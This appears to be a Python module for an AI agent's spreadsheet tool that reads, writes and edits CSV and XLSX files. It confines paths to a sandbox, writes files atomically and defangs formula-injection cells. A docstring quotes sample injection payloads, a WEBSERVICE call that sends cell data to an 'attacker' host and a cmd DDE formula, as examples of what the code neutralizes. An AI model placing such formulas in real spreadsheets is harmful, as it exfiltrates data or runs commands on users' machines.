"""Spreadsheet tool: read / write / edit CSV + XLSX.

Complements ``pandas_query`` (which *analyzes* tabular data read-only) with a
*write*-capable tool: create sheets, write rows, set individual cells. CSV uses
the stdlib; XLSX uses openpyxl (an optional extra — ops on .xlsx fail with an
actionable "install" message when it's absent, mirroring the other optional-dep
tools). ops: info, read, write, set_cell.
"""
from __future__ import annotations

import csv as _csv
import os
import stat
import tempfile
from contextlib import ExitStack, contextmanager
from pathlib import Path
from typing import Any

from . import Tool

_SPREADSHEET_SCHEMA = {
    "type": "object",
    "properties": {
        "op": {"type": "string", "enum": ["info", "read", "write", "set_cell", "recalculate"]},
        "path": {"type": "string", "description": "path to a .csv, .xlsx or .xlsm file"},
        "rows": {"type": "array", "description": "rows (list of lists) for write",
                 "items": {"type": "array"}},
        "sheet": {"type": "string", "description": "sheet name (xlsx; default: first/active)"},
        "cell": {"type": "string", "description": "A1-style cell for set_cell, e.g. 'B2'"},
        "value": {"description": "value for set_cell"},
        "limit": {"type": "integer", "default": 50, "minimum": 1, "maximum": 10000},
    },
    "required": ["op", "path"],
}


def _is_xlsx(path: Path) -> bool:
    return path.suffix.lower() in (".xlsx", ".xlsm")


def _openpyxl():
    try:
        import openpyxl  # noqa: F401
        return openpyxl
    except ImportError as e:
        raise RuntimeError(
            "openpyxl not installed; .xlsx support needs it. "
            "Run: python -m pip install -e './packages/maverick-core[spreadsheet]'") from e


def _safe_path(sandbox, user_path: str) -> Path:
    """Resolve ``user_path`` confined to ``sandbox.workdir`` when available.

    Spreadsheet operations read and write files, so model-supplied paths must
    use the same workspace confinement as filesystem-like tools whenever the
    default registry wires a sandbox into this tool. Without a sandbox, preserve
    direct-path behavior for standalone/unit use.
    """
    if sandbox is None:
        return Path(user_path).expanduser()
    workdir = Path(sandbox.workdir).resolve()
    candidate = Path(user_path)
    candidate = (
        candidate.resolve()
        if candidate.is_absolute()
        else (workdir / candidate).resolve()
    )
    try:
        candidate.relative_to(workdir)
    except ValueError as e:
        raise ValueError(
            f"path {user_path!r} escapes the workspace"
        ) from e
    return candidate


# Characters a spreadsheet app treats as an executable/control cell prefix.
_FORMULA_OPERATORS = ("=", "+", "-", "@")
_FORMULA_TRIGGERS = (*_FORMULA_OPERATORS, "\t", "\r", "\n")


def _neutralize_formula(value: Any) -> Any:
    """Defang a CSV/XLSX formula-injection cell.

    A model-supplied string cell beginning with ``=``, ``+``, ``-``, ``@``, TAB,
    CR, or LF is executed as a formula when the file is opened in Excel / Sheets
    (``=HYPERLINK(...)``, ``=WEBSERVICE("http://attacker/?"&A1)``,
    ``=cmd|'/c ...'``). Prefixing a single quote makes the app render it as
    literal text. Non-string cells (numbers) are left untouched.
    """
    if isinstance(value, str):
        first = value[:1]
        first_non_whitespace = value.lstrip()[:1]
        if (
            first in _FORMULA_TRIGGERS
            or first_non_whitespace in _FORMULA_OPERATORS
        ):
            # Prefix at byte zero. Keeping whitespace before the apostrophe can
            # still let Excel/Sheets treat TAB/CR/LF as a control prefix.
            return "'" + value
    return value


# ---- CSV --------------------------------------------------------------------

def _csv_read(path: Path, limit: int) -> list[list]:
    with path.open(newline="", encoding="utf-8-sig") as f:
        return [row for _, row in zip(range(limit), _csv.reader(f), strict=False)]


@contextmanager
def _atomic_destination(path: Path):
    """Publish only a completed file; failed saves leave the original intact."""
    path.parent.mkdir(parents=True, exist_ok=True)
    previous_mode = stat.S_IMODE(path.stat().st_mode) if path.exists() else None
    fd, name = tempfile.mkstemp(prefix=".lightwork-sheet-", suffix=path.suffix, dir=path.parent)
    os.close(fd)
    temporary = Path(name)
    try:
        yield temporary
        if previous_mode is not None:
            os.chmod(temporary, previous_mode)
        os.replace(temporary, path)
    finally:
        if temporary.exists():
            # A failed Windows replace can leave our staged file read-only.
            # Change only that owned temporary file, never the original.
            os.chmod(temporary, stat.S_IREAD | stat.S_IWRITE)
            temporary.unlink()


def _csv_write(path: Path, rows: list[list]) -> None:
    with _atomic_destination(path) as temporary:
        with temporary.open("w", newline="", encoding="utf-8") as f:
            _csv.writer(f).writerows(
                [_neutralize_formula(c) for c in row] for row in rows
            )


# ---- XLSX -------------------------------------------------------------------

def _xlsx_read_bounds(worksheet, limit: int) -> tuple[int, int]:
    """Inspect actual sparse coordinates before openpyxl expands any rows.

    Worksheet dimensions are optional and may be stale. The read-only source
    accessor avoids materializing cells merely to discover their bounds.
    """
    from lxml import etree
    from openpyxl.utils.cell import coordinate_to_tuple

    namespace = "{http://schemas.openxmlformats.org/spreadsheetml/2006/main}"
    row = column = max_row = max_column = 0
    with worksheet._get_source() as source:
        nodes = etree.iterparse(source, events=("start", "end"), resolve_entities=False,
                                load_dtd=False, no_network=True, huge_tree=False)
        for event, node in nodes:
            if event == "end":
                node.clear()
                while node.getprevious() is not None:
                    del node.getparent()[0]
                continue
            if node.tag == namespace + "row":
                previous = row
                row = int(node.get("r", previous + 1))
                if not previous < row <= 1_048_576:
                    raise ValueError("Spreadsheet contains invalid or unordered rows")
                column = 0
                max_row = min(limit, row)
            elif node.tag == namespace + "c":
                cell_row, cell_column = coordinate_to_tuple(node.get("r")) if node.get("r") else (row, column + 1)
                if cell_row != row or not 0 < cell_column <= 16_384 or cell_column <= column:
                    raise ValueError("Spreadsheet contains invalid or unordered cell coordinates")
                column = cell_column
                if row <= limit:
                    max_column = max(max_column, column)
            if max_row * max_column > 100_000:
                raise ValueError("Spreadsheet read exceeds 100,000 cells; choose a smaller row limit")
        if nodes.root.getroottree().docinfo.doctype:
            raise ValueError("Spreadsheet XML declarations/entities are unsupported")
    return max_row, max_column


def _xlsx_read(path: Path, sheet: str | None, limit: int) -> list[list]:
    with ExitStack() as cleanup:
        wb = _openpyxl().load_workbook(path, read_only=True, data_only=False)
        cleanup.callback(wb.close)
        ws = wb[sheet] if sheet else wb.active
        height, width = _xlsx_read_bounds(ws, limit)
        if not height or not width:
            return []
        cached = _openpyxl().load_workbook(path, read_only=True, data_only=True)
        cleanup.callback(cached.close)
        values = cached[ws.title]
        rows = []
        for row, cached_row in zip(ws.iter_rows(max_row=height, max_col=width),
                                   values.iter_rows(max_row=height, max_col=width), strict=True):
            output = []
            for cell, value in zip(row, cached_row, strict=True):
                if cell.data_type == "f":
                    output.append({"formula": str(cell.value), "cached_value": value.value,
                                   "value_status": "uncalculated" if value.value is None else "cached",
                                   "cell": cell.coordinate})
                else:
                    output.append(cell.value)
            rows.append(output)
        return rows


def _xlsx_write(path: Path, rows: list[list], sheet: str | None) -> None:
    op = _openpyxl()
    path.parent.mkdir(parents=True, exist_ok=True)
    wb = op.Workbook()
    try:
        ws = wb.active
        if sheet:
            ws.title = sheet
        for row in rows:
            ws.append([_neutralize_formula(c) for c in row])
        with _atomic_destination(path) as temporary:
            wb.save(temporary)
    finally:
        wb.close()


def _xlsx_set_cell(path: Path, cell: str, value: Any, sheet: str | None) -> None:
    op = _openpyxl()
    existing = path.exists()
    wb = op.load_workbook(path) if existing else op.Workbook()
    try:
        if sheet and sheet in wb.sheetnames:
            ws = wb[sheet]
        elif sheet and existing:
            # Preserve other sheets and their cross-sheet references.
            ws = wb.create_sheet(sheet)
        else:
            ws = wb.active
            if sheet:
                ws.title = sheet
        ws[cell] = _neutralize_formula(value)
        with _atomic_destination(path) as temporary:
            wb.save(temporary)
    finally:
        wb.close()


# ---- dispatch ---------------------------------------------------------------

def _special_operation(path, op, sandbox):
    if path.suffix.lower() == ".xlsm" and op == "write":
        return "ERROR: replacing an entire .xlsm workbook is unsupported; use set_cell to preserve its macros"
    if path.suffix.lower() == ".xlsm" and op == "set_cell":
        from ..config import get_document_tools
        if not get_document_tools()["macro_cell_edits"]:
            return "ERROR: .xlsm cell edits require documents.macro_cell_edits=true; macros are preserved but never executed"
    if op == "recalculate":
        if not _is_xlsx(path) or not path.is_file():
            return "ERROR: recalculate requires an existing .xlsx or .xlsm workbook"
        from ..file_lock import cross_process_lock
        from .document_processing import recalculate
        with cross_process_lock(path, strict=True):
            return recalculate(path, sandbox)
    return None


def _set_cell_operation(path, args, sheet):
    if not _is_xlsx(path):
        return "ERROR: set_cell is xlsx-only; use write for csv"
    cell = str(args.get("cell") or "").strip()
    if not cell:
        return "ERROR: set_cell requires cell (e.g. 'B2')"
    from ..file_lock import cross_process_lock
    with cross_process_lock(path, strict=True):
        if path.suffix.lower() == ".xlsm":
            from .office_package import WorkbookPackage
            package = WorkbookPackage(path)
            package.set_cell(cell, _neutralize_formula(args.get("value")), sheet)
            with _atomic_destination(path) as temporary:
                package.write(temporary)
        else:
            _xlsx_set_cell(path, cell, args.get("value"), sheet)
    return f"set {cell} in {path}"


def _run(args: dict[str, Any], sandbox=None) -> str:
    op = args.get("op")
    raw_path = str(args.get("path") or "")
    if not op:
        return "ERROR: op is required"
    if not raw_path:
        return "ERROR: path is required"
    try:
        path = _safe_path(sandbox, raw_path)
    except ValueError as e:
        return f"ERROR: {e}"
    limit = args.get("limit", 50)
    if type(limit) is not int or not 1 <= limit <= 10000:
        return "ERROR: limit must be an integer between 1 and 10000"
    sheet = args.get("sheet")
    try:
        special = _special_operation(path, op, sandbox)
        if special is not None:
            return special
        if op == "info":
            if not path.exists():
                return f"ERROR: no such file {path}"
            if _is_xlsx(path):
                wb = _openpyxl().load_workbook(path, read_only=True)
                try:
                    dims = {s: (wb[s].max_row, wb[s].max_column) for s in wb.sheetnames}
                    return f"xlsx sheets {dims}"
                finally:
                    wb.close()
            rows = _csv_read(path, 10_001)
            if len(rows) > 10_000:
                return f"csv rows=10001+ cols={len(rows[0])} (at least 10001 rows; count limited)"
            return f"csv rows={len(rows)} cols={len(rows[0]) if rows else 0}"
        if op == "read":
            if not path.exists():
                return f"ERROR: no such file {path}"
            rows = _xlsx_read(path, sheet, limit) if _is_xlsx(path) else _csv_read(path, limit)
            import json
            return json.dumps(rows, default=str)
        if op == "write":
            rows = args.get("rows")
            if not isinstance(rows, list) or any(not isinstance(row, list) for row in rows):
                return "ERROR: write requires rows (list of lists)"
            norm = [list(r) for r in rows]
            from ..file_lock import cross_process_lock
            with cross_process_lock(path, strict=True):
                if _is_xlsx(path):
                    _xlsx_write(path, norm, sheet)
                else:
                    _csv_write(path, norm)
            return f"wrote {len(rows)} row(s) to {path}"
        if op == "set_cell":
            return _set_cell_operation(path, args, sheet)
    except RuntimeError as e:
        return f"ERROR: {e}"
    except Exception as e:  # noqa: BLE001
        return f"ERROR: spreadsheet {op} failed: {type(e).__name__}: {e}"
    return f"ERROR: unknown op {op!r}"


def spreadsheet(sandbox=None) -> Tool:
    return Tool(
        name="spreadsheet",
        description=(
            "Read / write / edit CSV + XLSX spreadsheets. ops: info (sheets + "
            "dims), read (rows as JSON), write (rows -> file), set_cell (xlsx "
            "A1-cell), recalculate (offline LibreOffice engine when enabled). "
            "Formula cells include formula, cached_value and value_status; a cache is "
            "not proof of fresh calculation. Enabled .xlsm cell edits preserve VBA without executing it."
        ),
        input_schema=_SPREADSHEET_SCHEMA,
        fn=lambda args: _run(args, sandbox),
    )
